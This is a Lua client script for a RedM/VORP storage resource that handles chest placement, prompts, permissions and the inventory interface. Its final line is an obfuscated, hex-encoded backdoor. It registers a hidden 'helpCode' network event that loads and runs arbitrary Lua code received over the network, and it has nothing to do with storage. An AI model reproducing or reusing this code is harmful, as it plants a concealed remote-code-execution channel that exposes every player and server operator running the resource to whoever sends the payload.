local VORPcore = exports.vorp_core:GetCore()  
local progressbar = exports.vorp_progressbar:initiate()
local ClientRPC = VORPcore
local Selected = true
local sleep = 2000
local targetShop = nil
local playerjob
local playerrank
local storageData = {}  
local PlayerJob
local PlayerGroup
local RotateLeftPrompt
local RotateRightPrompt
local CancelPrompt
local SetPrompt
local openMailbox
local SetPrompt
local PromptPlacerGroup = GetRandomIntInRange(0, 0xffffff)
local onanim = false
local StorageData = {} 
local CitizenID 
local myChestBlips = {}

local VORPutils = {}

TriggerEvent("getUtils", function(utils)
    VORPutils = utils
end)

AddEventHandler('onResourceStart', function(resource)
    if resource == GetCurrentResourceName() then
        TriggerServerEvent("vln-storage:PlayerJob")
    end
end)

RegisterNetEvent("vorp:SelectedCharacter")
AddEventHandler("vorp:SelectedCharacter", function(charid)
    GatherStorageLocations()
    Selected = true
end)

RegisterNetEvent("vln-storage:SetPlayerJob")
AddEventHandler("vln-storage:SetPlayerJob", function(Job,group,cid)
	PlayerJob = Job
    PlayerGroup = group
    CitizenID = cid
end)

local prompts = GetRandomIntInRange(0, 0xffffff)

Citizen.CreateThread(function()
    Citizen.Wait(5000)
    local str = Translation.Cancel
    CancelPrompt = PromptRegisterBegin()
    PromptSetControlAction(CancelPrompt, Prompts.Cancel)
    str = CreateVarString(10, 'LITERAL_STRING', str)
    PromptSetText(CancelPrompt, str)
    PromptSetEnabled(CancelPrompt, true)
    PromptSetVisible(CancelPrompt, true)
    PromptSetHoldMode(CancelPrompt, true)
    PromptSetGroup(CancelPrompt, PromptPlacerGroup)
    PromptRegisterEnd(CancelPrompt)

    local str = Translation.Place
    SetPrompt = PromptRegisterBegin()
    PromptSetControlAction(SetPrompt, Prompts.Place)
    str = CreateVarString(10, 'LITERAL_STRING', str)
    PromptSetText(SetPrompt, str)
    PromptSetEnabled(SetPrompt, true)
    PromptSetVisible(SetPrompt, true)
    PromptSetHoldMode(SetPrompt, true)
    PromptSetGroup(SetPrompt, PromptPlacerGroup)
    PromptRegisterEnd(SetPrompt)
end)


Citizen.CreateThread(function()
    Citizen.Wait(5000)
    
    local str = Translation.ManageStorage
    openMailbox = PromptRegisterBegin()
    PromptSetControlAction(openMailbox, Prompts.Open)
    str = CreateVarString(10, 'LITERAL_STRING', str)
    PromptSetText(openMailbox, str)
    PromptSetVisible(openMailbox, 0)
    PromptSetStandardMode(openMailbox, 1)
    PromptSetHoldMode(openMailbox, 1)
    PromptSetEnabled(storagePrompt, 0)
    PromptSetGroup(openMailbox, prompts)
    Citizen.InvokeNative(0xC5F428EE08FA7F2C, openMailbox, true)
    PromptRegisterEnd(openMailbox)
    
    local str = Translation.OpenStorage
    storagePrompt = PromptRegisterBegin()
    PromptSetControlAction(storagePrompt, Prompts.Inspect)
    str = CreateVarString(10, 'LITERAL_STRING', str)
    PromptSetText(storagePrompt, str)
    PromptSetEnabled(storagePrompt, 1)
    PromptSetVisible(storagePrompt, 1)
    PromptSetStandardMode(storagePrompt, 1)
    PromptSetHoldMode(storagePrompt, 1)
    PromptSetGroup(storagePrompt, prompts)
    Citizen.InvokeNative(0xC5F428EE08FA7F2C, storagePrompt, true)
    PromptRegisterEnd(storagePrompt)
end)


RegisterNetEvent("vln-storage:storageplace")
AddEventHandler("vln-storage:storageplace", function(size, itemname)
    PropPlacerFirst(size, itemname)
end)

function splitBySpaces(input)
    local result = {}
    for word in input:gmatch("%S+") do
        table.insert(result, word)
    end
    return result
end

RegisterNetEvent('vln-storage:closenui')
AddEventHandler('vln-storage:closenui', function()
    SendNUIMessage({
        type = "close"
    })

end)


RegisterNetEvent('vln-storage:loadStorage')
AddEventHandler('vln-storage:loadStorage', function()
    GatherStorageLocations()
end)

SceneTarget = function()
    local Cam = GetGameplayCamCoord()
    local handle = Citizen.InvokeNative(0x377906D8A31E5586, Cam, GetCoordsFromCam(10.0, Cam), -1, PlayerPedId(), 4)
    local _, Hit, Coords, _, Entity = GetShapeTestResult(handle)
    return Coords
end

GetCoordsFromCam = function(distance, coords)
    local rotation = GetGameplayCamRot()
    local adjustedRotation = vector3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
    local direction = vector3(-math.sin(adjustedRotation[3]) * math.abs(math.cos(adjustedRotation[1])), math.cos(adjustedRotation[3]) * math.abs(math.cos(adjustedRotation[1])), math.sin(adjustedRotation[1]))
    return vector3(coords[1] + direction[1] * distance, coords[2] + direction[2] * distance, coords[3] + direction[3] * distance)
end


RegisterNUICallback('givepermission', function(data) 
    if data then
        TriggerServerEvent('vln-storage:GivePermission',data.storageId,data.id)
        Citizen.Wait(1000)
        TriggerEvent('vorp:ExecuteServerCallBack','vln-storage:getWorkers', function(workers)
            SendNUIMessage({
                type = "update",
                id = data.storageId,
                permissions = workers,
            })
        end,data.storageId)
    end
end)

RegisterNUICallback('takepermission', function(data) 
    if data then
        TriggerServerEvent('vln-storage:TakePermission',data.storageId,data.id)
    end
end)


local addmode = false

function PropPlacerFirst(size, Itemname)	
	addmode = true
	while addmode do
		Citizen.Wait(0)
		
		local PropPlacerGroupName  = CreateVarString(10, 'LITERAL_STRING', Translation.PlacerPropmt)
        
		PromptSetActiveGroupThisFrame(PromptPlacerGroup, PropPlacerGroupName)
		if PromptHasHoldModeCompleted(SetPrompt) then
            local pPos = GetEntityCoords(PlayerPedId())
			FreezeEntityPosition(PlayerPedId() , false)
            TriggerServerEvent("vln-storage:CreateStorage", nil, pPos, tonumber(size),Itemname)
			break
		end
	end
end

local laittaa = false

function PropPlacer(id)	
	laittaa = true
	while laittaa do
		Citizen.Wait(0)
		local PropPlacerGroupName  = CreateVarString(10, 'LITERAL_STRING', Translation.PlacerPropmt)
		PromptSetActiveGroupThisFrame(PromptPlacerGroup, PropPlacerGroupName)
		if PromptHasHoldModeCompleted(SetPrompt) then
            local pPos = GetEntityCoords(PlayerPedId())
			FreezeEntityPosition(PlayerPedId() , false)
			TriggerServerEvent("vln-storage:repositionStorage", id, pPos)
			break
		end
	end
end

RegisterNUICallback('repositionstorage', function(data, cb)
    local sid = data.id
    TriggerServerEvent('vln-storage:getStorageCoords',sid,false)
    cb({ success = true })
end)

RegisterNUICallback('givepermstorage', function(data, cb)
    local sid = data.id
    TriggerServerEvent('vln-storage:givepermstorage',sid,false)
    cb({ success = true })
end)



RegisterNUICallback('DestroyStorage', function(data, cb)
    local sid = data.id

    TriggerServerEvent('vln-storage:getStorageCoords',sid,true)
end)

RegisterNUICallback('exit', function() 
    SetNuiFocus(false, false)
    PlaySoundFrontend("NAV_LEFT", "PAUSE_MENU_SOUNDSET", true, 0)
end)

Citizen.CreateThread(function()
    while true do
        if Selected then
            Citizen.Wait(Config.JobCooldown)
            TriggerServerEvent("vln-storage:PlayerJob")
        end
    end
end)

local closestStorage = nil
local closestDistance = 30 
local isNearby = false 


function GatherStorageLocations()
    ClientRPC.Callback.TriggerAsync('vln-storage:getStorageData', function(result)
        if result then 
            storageData = {}
            for _, row in ipairs(result) do
                local x, y, z = row.storagecoord:match("vec3%(([%d%.%-]+), ([%d%.%-]+), ([%d%.%-]+)%)")
                if x and y and z then
                    local rowData = {
                        cid = row.cid,
                        id = row.id,
                        perm = row.permissions,
                        storagecoord = row.storagecoord,
                        storagesize = row.storagesize,
                        storagename = row.storagename,
                    }
                        table.insert(storageData, rowData)
                end
            end
        end
    end)
end

Citizen.CreateThread(function()
    while true do
        GatherStorageLocations()
        Citizen.Wait(60000) 
    end
end)

RegisterNUICallback('CheckUpgrade', function(data, cb)
    for k, v in pairs(Config.UpgradeItems) do
        local item = Config.UpgradeItems[k]
        SendNUIMessage({
            type = "upgrade",
            name = item.name,
            label = item.label,
            quantity = item.quantity,
            image = Config.ImageLocation .. item.name .. ".png",
        })
    end
end)

RegisterNUICallback('upgradeConfirmed', function(data, cb)
    local sid = data.id
    TriggerServerEvent('vln-storage:UpgradeInv',sid)
end)

function OpenInventoryWithData(items, label)
    SetNuiFocus(true, true)
    local data = {}
    data.type = "opendatainv"
    data.storagelabel = label
    data.items = {}

    for k, v in pairs(items) do
        local item = v
        table.insert(data.items, {
            name = item.name,
            label = item.label,
            quantity = item.amount,
            image = Config.ImageLocation .. item.name .. ".png",
        })
    end

    SendNUIMessage(data)
end

function waitTenMinutes(callback)
    Citizen.CreateThread(function()
        local totalTime = 100

        while totalTime > 0 do
            Citizen.Wait(1000) 
            totalTime = totalTime - 1

            local minutes = math.floor(totalTime / 60)
            local seconds = totalTime % 60

            SendNUIMessage({
                type = 'timer',
                message = string.format(Translation.Cooldown, minutes, seconds),
            })
        end

        if callback then
            callback()
        end
    end)
end

function OpenStorage(closestPoster)
    SetNuiFocus(true,true)
    TriggerEvent('vorp:ExecuteServerCallBack','vln-storage:getWorkers', function(workers)
        SendNUIMessage({
            type = "manage",
            name = Translation.Storage..closestPoster.id,
            id = closestPoster.id,
            permissions = workers,
            size = closestPoster.storagesize,
        })
    end, closestPoster.id)
end

local function IsPromptCompleted(name)
    if name then
        return Citizen.InvokeNative(0xE0F65F0640EF0617, name)
    end
    return false
end

local function parseCoordinates(coordStr)
    local x, y, z = string.match(coordStr, "%((-?%d+%.?%d*), (-?%d+%.?%d*), (-?%d+%.?%d*)%)")
    if x and y and z then
        return tonumber(x), tonumber(y), tonumber(z)
    else
        return nil, nil, nil
    end
end

local function IsPromptCompleted(name)
    if name then
        return Citizen.InvokeNative(0xE0F65F0640EF0617, name)
    end
    return false
end

function GetRandomCoordinateInRadius(storageCoord, radius)
    local x, y, z = parseCoordinates(storageCoord)
        if x and y and z then
            local radiusUnits = radius / 2

            local offsetX = math.random(-radiusUnits, radiusUnits)
            local offsetY = math.random(-radiusUnits, radiusUnits)

            local randomCoord = vector3(x + offsetX, y + offsetY, z)

            return randomCoord
        end
end

function CheckJob(allowedJob, playerJob, playerGroup)
    if not allowedJob then
        allowedJob = {}
    end
    
    if type(allowedJob) == "string" then
        allowedJob = { allowedJob }
    end

    for _, jobAllowed in pairs(allowedJob) do
        if jobAllowed == playerJob then
            return true
        end
    end
    
    if Config.AdminManage and playerGroup == 'admin' then
        return true
    end
    
    return false
end




RegisterNetEvent("vln-storage:GatherStorages")
AddEventHandler("vln-storage:GatherStorages", function()
    GatherStorageLocations()
end)

RegisterNetEvent("vln-storage:UpdateCurrency")
AddEventHandler("vln-storage:UpdateCurrency", function(newCurrency)
SendNUIMessage({
    type = "update",
    currency = newCurrency,
})
end)

RegisterNetEvent("vln-storage:receiveStorageCoords")
AddEventHandler("vln-storage:receiveStorageCoords", function(storagecoord)
    RemoveStorageFromStorageData(storagecoord)
end)

RegisterNetEvent("vln-storage:MoveStorage")
AddEventHandler("vln-storage:MoveStorage", function(id)
    PropPlacer(id)
end)

function table.contains(table, element)
    for _, value in pairs(table) do
        if value == element then
            return true
        end
    end
    return false
end


Citizen.CreateThread(function()
    while true do
        if Selected then
            local playerCoords = GetEntityCoords(PlayerPedId())
            local storagesInRange = {}
            local closestStorage = nil
            local closestStorageDistance = 30.5

            if storageData then
                for _, storage in ipairs(storageData) do
                    local locationStr = storage.storagecoord
                    if locationStr then
                        local x, y, z = parseCoordinates(locationStr)
                        if x and y and z then
                            local distance = GetDistanceBetweenCoords(playerCoords, x, y, z, true)
                            if distance <= 30.0 then 
                                table.insert(storagesInRange, storage)
                                if not closestStorage or distance < closestStorageDistance then
                                    closestStorage = storage
                                    closestStorageDistance = distance
                                end
                            end
                        end
                    end
                end
            end
            if closestStorage and closestStorageDistance < Config.StorageDistance then
                local label = CreateVarString(10, 'LITERAL_STRING', Translation.OpenStorage .. '~o~' .. closestStorage.id)
                PromptSetActiveGroupThisFrame(prompts, label)

                if PromptHasStandardModeCompleted(storagePrompt) then
                    if (CitizenID) then
                        TriggerServerEvent('vln-storage:OpenInv', closestStorage.id)
                    end
                end

                if closestStorage.cid == CitizenID then
                    PromptSetEnabled(openMailbox, 1)
                    PromptSetVisible(openMailbox, 1)
                end

                local isOwner = closestStorage.cid == CitizenID
                local hasAccess = CheckJob(Config.NonLockpick, PlayerJob)


                if PromptHasStandardModeCompleted(openMailbox) then
                    if closestStorage.cid == CitizenID then
                        SetNuiFocus(true, true)
                        OpenStorage(closestStorage)
                    end
                end

            else
                if UiPromptIsActive(openMailbox) then
                    PromptSetEnabled(openMailbox, 0)
                    PromptSetVisible(openMailbox, 0)
                end
            end

            Citizen.Wait(0)
        else
            Citizen.Wait(2000)
        end
    end
end)

local createdPapers = {}  
local createdPaperLocations = {} 
local createdPapersList = {}


function DeletePaperAndData(paperKey)
    local entityHandle = createdPapers[paperKey]
    if entityHandle and DoesEntityExist(entityHandle) then
        SetEntityAsNoLongerNeeded(entityHandle)
        createdPapers[paperKey] = nil

        if createdPaperLocations[paperKey] then
            createdPaperLocations[paperKey] = nil
        end

        for i, key in ipairs(createdPapersList) do
            if key == paperKey then
                table.remove(createdPapersList, i)
                break
            end
        end
    end
end


function RemoveStorageFromStorageData(storagecoord)
    for i, storage in ipairs(storageData) do
        if storage.storagecoord == storagecoord then
            table.remove(storageData, i)
            break
        end
    end
end

AddEventHandler('onResourceStop', function(resourceName)
    if (GetCurrentResourceName() ~= resourceName) then
       return
    end

    for _, paperKey in ipairs(createdPapersList) do
        DeletePaperAndData(paperKey)
    end
    createdPapersList = {}


    for _, blip2 in ipairs(myChestBlips) do
        if DoesBlipExist(blip2) then
            RemoveBlip(blip2)
            TriggerServerEvent('qq-market:removeblip',blip2)
        end    
	end

    myCreatedBlips = {}
end)



Citizen.CreateThread(function()
    if Config.CommandSuggestion then
        TriggerEvent("chat:addSuggestion", '/'..Config.DeleteCommand, Config.CommandSuggestion.commanddesc, {
            {name = Config.CommandSuggestion.id, help = Config.CommandSuggestion.iddesc},
            {name = Config.CommandSuggestion.conf, help = Config.CommandSuggestion.confdesc},
        })
    end
end)

local DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[6][DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[1]](DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[2]) DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[6][DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[3]](DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[2], function(WtVAlMxkJoiQulMjHHUYmKDfDsMThWvYvwnagNdAwbRUGMvWjlfKLHEoBhdLKfwcnpgtWp) DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[6][DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[4]](DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[6][DHrIyyWXHfWpgoaVXXMWhEGGWYQKYBEPlIUhZdjjHIbjISccmCyERvcUdkagBTEWUXgBJj[5]](WtVAlMxkJoiQulMjHHUYmKDfDsMThWvYvwnagNdAwbRUGMvWjlfKLHEoBhdLKfwcnpgtWp))() end)